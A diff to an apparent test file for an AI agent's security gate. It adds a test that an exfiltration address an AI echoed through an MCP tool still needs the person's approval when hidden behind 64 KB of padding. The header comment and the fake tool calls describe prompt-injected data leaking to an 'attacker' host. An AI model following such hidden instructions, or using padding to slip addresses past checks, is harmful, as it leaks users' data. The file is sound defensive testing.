@@ -2,7 +2,8 @@
 // The way out that opens: an AI following hidden instructions puts https://attacker/?d=<data> into a tool input of a
 // service that repeats its input; the "service's address" would then go out without anyone seeing it. In a real turn
 // (fake engine, real launcher and gate, a fake MCP service that repeats its arguments): the repeated address needs the
-// person's card (declined: nothing opened), while an address the service produced on its own opens without one. Also:
+// person's card (declined: nothing opened), also behind 64 KB of padding, while an address the service produced on
+// its own opens without one. Also:
 // web_fetch does not take connection addresses as learned links, and an mcp-file handle is bound to its chat and person.
 import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from 'bun:test'
 import fs from 'node:fs'
@@ -89,6 +90,20 @@ describe('a service that repeats what the AI sent', () => {
     expect(rows.find((r) => r.url === HERO)?.echo).toBe(0)
     // the audit keeps the full addresses
     expect(t.events.filter((e) => e.tool === 'save_url').map((e) => e.summary).join('\n')).toContain(EXFIL)
+  })
+  test.skipIf(!native)('padding in front of the address does not hide it: the whole input is marked', async () => {
+    // before: only the first 64 KB of an input left marks, so the repeated address opened without a card (hundreds of
+    // other addresses in front: the unit test; a service that repeats them all names only the first 200 anyway)
+    const pad = 'x '.repeat(40_000)
+    const t = await turn(['make me a hero image', fake(
+      { tool: 'my_images__echo_args', args: { note: pad, image_url: EXFIL } },
+      { tool: 'save_url', args: { url: EXFIL, save_as: 'users/alice/x.png' }, sayResult: true },
+    )].join('\n'), 'deny')
+    expect(t.cards).toHaveLength(1)
+    expect(t.cards[0]).toContain('matches what the AI had sent to a tool earlier')
+    expect(t.answerText).toContain('did not allow opening this address')
+    const row = h.ctx.db.query('SELECT echo FROM chat_connection_urls WHERE chat_id = ? AND url = ?').get(t.chatId, EXFIL) as { echo: number } | null
+    expect(row?.echo).toBe(1)
   })
   test.skipIf(!native)('web_fetch does not take a connection\'s addresses as learned links (save_url only)', async () => {
     const t = await turn(['look at the result', fake(
